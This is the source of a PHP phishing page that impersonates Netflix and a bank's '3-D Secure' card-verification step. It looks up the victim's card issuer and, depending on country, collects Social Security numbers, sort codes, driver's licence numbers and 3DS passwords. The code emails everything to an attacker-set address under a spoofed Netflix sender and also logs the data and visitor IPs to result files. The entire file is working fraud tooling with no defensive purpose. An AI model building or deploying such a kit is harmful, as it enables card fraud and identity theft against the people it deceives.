<?php
session_start();
$settings = parse_ini_file('../.config');
require_once('../inc/config.inc.php');
require_once("../inc/function.inc.php");
$ip=getip();
$ccc = str_replace(" ", "", substr($_SESSION['Card Number'], 0, 9));
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($ccc,0,7);
$url = "https://lookup.binlist.net/".$ccc;
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$output = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
$output = json_decode($output);
$bank_name = $output->bank->name;
$bank_phone = $output->bank->phone;
$bank_url = $output->bank->url;
$countryy = $output->country->name;
$brand = $output->scheme;
$ip = $_SERVER['REMOTE_ADDR'];
  if($countryy == "United States of America") {
    $ssn = true;
    $soc = false;
    $mid = false;
    $dls = false;
    $p3d = false;
    $clm = false;
  } else if(substr($countryy ,0 , 14) == "United Kingdom") {
    $ssn = false;
    $soc = true;
    $mid = false;
    $dls = false;
    $p3d = false;
    $clm = false;
  } else if($countryy == "Canada") {
    header("location: account/done.php");
  } else if($brand == "amex") {
    header("location: account/done.php");
  } else if($countryy == "Australia") {
    $ssn = false;
    $soc = false;
    $mid = true; 
    $dls = true;
    $p3d = false;
    $clm = true;
  } else {
    $mid = false;
    $ssn = false;
    $soc = false;
    $dls = false;
    $p3d = true;
    $clm = false;
  }
if(isset($_POST['3ds_code'])) {
  $passvbv = $_POST['3ds_code'];
  $ssncode = "";
  $socode = "";
  $membid = "";
  $license = "";
  $pass3d = "";
  $credklim = false;
  if($ssn) {
    $ssncode = $_SESSION['Social Security Number (US)'] = $_POST['ssn_vbv1']."-".$_POST['ssn_vbv2']."-".$_POST['ssn_vbv3'];
  }
  if($soc) {
    $socode = $_SESSION['Sort Code (UK)'] = $_POST['soc_vbv1']."-".$_POST['soc_vbv2']."-".$_POST['soc_vbv3'];
  }
    if($mid) {
    $membid = $_SESSION['Member id (AU)'] = $_POST['memb_id'];
  }
      if($clm) {
    $membid = $_SESSION['Credit limit (AU)'] = $_POST['creditlimit'];
  }
  if($dls) {
    $license = $_SESSION['Drivers License'] = $_POST['license_num'];
  }
  if($p3d) {
    $pass3d = $_SESSION['3D Secure'] = $_POST['p3d_code'];
  }
$subject = "$ip $ccc VBV  ***" ;
$to = $settings['email'];

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$headers .= "From: NETFLIX<a@memekcorp.xyz>" . "\r\n";

 
$message .= "#------------------------[ SECURE INFORMATION ]------------------------------#\n";
$message .= "CC Number	            	: ".$ccc."\r\n";
$message .= "Sort Code	 				: ".$socode."\r\n";
$message .= "Credit Limit				: ".$_POST['creditlimit']."\r\n";
$message .= "VBV Code					: ".$passvbv."\r\n";
$message .= "ID Number					: ".$_POST['idnumber']."\r\n";
$message .= "Driver ID					: ".$_POST['license_num']."\r\n";
$message .= "Password					: ".$_POST['p3d_code']."\r\n";
$message .= "National ID				: ".$_POST['nationalid']."\r\n";
$message .= "Citizen ID					: ".$_POST['citizenid']."\r\n";
$message .= "Member   Number			: ".$_POST['memb_id']."\r\n";
$message .= "Social Insurance Number	: ".$_POST['cassn']."\r\n";
$message .= "Social Security Number		: ".$ssncode."\r\n";
$message .= "Account Number				: ".$_POST['acc_number']."\r\n";
$message .= "OSID Number				: ".$_POST['osidnum']."\r\n";
$message .= "#--------------------------[ PC INFORMATION ]--------------------------------#\n"; 
 
mail($to,$subject,$message,$headers);
$subbin = $_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_brand']." ".$_SESSION['bank_name'];
@fclose(@fwrite(@fopen("../result/result-info.txt", "a"),"Title: $subject\n".$message));
@fclose(@fwrite(@fopen("../result/vbv-info.txt", "a"),"Title: $subject\n".$message));
$click = fopen("../result/log_visitor.txt","a");

fwrite($click,"[$ip] Fill VBV"."\n");
fclose($click);

$click = fopen("../result/total_vbv.txt","a");
fwrite($click,"$ip"."\n");
fclose($click); 
 
 
 
 
 
 
 
 
 
// send($_SESSION,$to,$subject) ; 
header("location: account/done.php");

}
?>


<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <title>3-D Security Auth.</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" href="assets/lib/css/V_SYPHER.css">
      <link type="text/css" rel="stylesheet" href="assets/lib/css/netflix_btn.css"/>
      <link type="text/css" rel="stylesheet" href="assets/lib/css/codex.authentication.css" />
      <link rel="shortcut icon" href="assets/lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="assets/lib/img/nficon2016.png"/>
      <style type="text/css">
         textarea:focus, input:focus, input[type]:focus, .uneditable-input:focus {   
         border-color: #e50914;
         box-shadow: 0 1px 1px rgba(229, 103, 23, 0.075) inset, 0 0 8px rgba(229, 103, 23, 0.6);
         outline: 0 none;
         }
      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
   <body>
           <div id="Rotation">
         <p style="font-size: 13px;">3-D Security has been successfully processed...</p>
      </div>
      <div id="xMarcos_9X9X" style="opacity: 1;">
             <div id="popup">
            <p style="font-size: 15px;">Processing </p>
         </div>
         <br>
                  <div id="xGhostRiderForm" style="display:none !important;">

            <div class="a-section a-spacing-medium a-text-center">
               <a href="#" class="svg-nfLogo signupBasicHeader">
                  <svg height="45" width="167" class="svg-icon svg-icon-netflix-logo " xmlns="http://www.w3.org/2000/svg" width="1024" height="276.742" viewBox="0 0 1024 276.742">
                     <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676l-49.458-144.856v151.073c-15.404 1.621-29.457 3.783-44.051 5.945v-276.742h41.08l56.212 157.021v-157.021h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461v-255.39h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862v198.908c-14.594 0-29.188 0-43.239.539v-199.447h-44.862v-43.242h132.965l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433v-239.718h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676v-242.689h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242v-254.58h-42.43v251.338zm231.881-251.338l-54.863 131.615 54.863 145.127c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75-50.269-129.992h46.482l28.377 72.699 30.27-72.699h47.295z" fill="#d81f26"/>
                  </svg>
               </a>
            </div>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
               <form method="post" action="">
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                           <div class="a-box a-spacing-base">
                              <div class="a-box-inner a-padding-extra-large">
                                 <table>
                                    <tbody>
                                       <tr>
                                          <td><img class="cc_bank" id="cc_bank" src="assets/lib/img/ssl.png"></td>
                                          <?php 
                                             if($brand == "mastercard") {  
											         $Type_XXX = "MasterCard SecureCode";
        $VBV_Name = "SecureCode";
                                                                      echo '<td><img class="cc_type" id="cc_type" src="assets/lib/img/mastercard-securecode.png"></td>';
                                             }elseif($brand == "visa"){
                                              echo '<td><img class="cc_type" id="cc_type" src="assets/lib/img/verified-by-visa.png"></td>';
        $Type_XXX = "Verified by Visa";
        $VBV_Name = "3D Password ";                                       
									   }
                                             ?>
                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
                                 <style>
                                    width:230px;
                                 </style>
                                 <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$bank_name;?></div>
                                 <div id="xDoctorStrange_L1">Added Safety Online</div>
                                 <div id="xDoctorStrange_L2"><?=$Type_XXX;?> helps protect your <b></b> card against unauthorized use online - at no additional cost. To use <?=$Type_XXX;?> on this and futur purshases. complete this page You'll the create your own <?=$Type_XXX;?> Password</div>
                                 <div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">Name on card :</td>
                                             <td><?=htmlentities($_SESSION['Card Holder']);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">Country Name :</td>
                                             <td class="limit"><?=ucwords(strtolower($countryy));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">Card Type :</td>
                                             <td><?=ucwords(strtolower($brand));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">Card Number :</td>
                                             <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['Card Number'] , -4);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">Date time :</td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                           
                                             <?php
                                                ########################## AUSTRALIA ###########################
                                                if($mid) {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Member ID :</td>
                                                <td><input required type="tel" name="memb_id" id="osid" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Credit Limit :</td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Drivers License Number :</td>
                                                <td><input required type="tel" name="license_num" id="driverslicense" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }
                                                ################# UNITED KINGDOM  ###################
                                                elseif ($soc) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Sort Code :</td>
                                                <td><input required type="tel" name="soc_vbv1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="soc_vbv2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="soc_vbv3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  ';        
                                                 
                                                        }
                                                #################### UNITED STATES ###################
                                                elseif ($ssn) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Social Security Number :</td>
                                                <td><input required type="tel" name="ssn_vbv1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn_vbv2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn_vbv3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                   
                                                ?>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                                                <td><input type="password" name="3ds_code" id="password_vbv" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
                                             <tr>
                                                <td><?=$bank_phone;?></td>
                                                <td><?=$bank_url;?></td>
                                             </tr>
                                       </tbody>
                                    </table>
                                 </div>
                                 <br>
                                 <button style="font-size: 15px;font-weight: normal;" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit">CONFIRM & ACTIVATE</button>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none">Cannot access your <?=$Type_XXX;?>?
                        <div class="a-section">    <span>Contact </span>
                           <a class="a-link-normal">Netflix Customer Service</a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div class="a-divider a-divider-section">
               <div class="a-divider-inner"></div>
            </div>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-small a-text-center">
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  Conditions of Use
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  Privacy Notice
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  Help
                  </a>
                  <span class="auth-footer-separator"></span>
               </div>
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  © 1997-<?=date('Y');?>, Netflix, Inc. or its affiliates
                  </span>
               </div>
            </div>
                     </div>
      </div>
      </div>
            <script type="text/javascript">
      $(document).ready(function(){
      $("#popup").delay(1000).fadeOut(0);
      $("#xGhostRiderForm").delay(1000).fadeIn(300);
      $("#submit").on('click', function () {
      $('#Rotation').fadeIn(300);
      });});
      </script>
      <script type="text/javascript" src="assets/lib/js/jquery.bootstrap.js"></script>
   </body>
</html>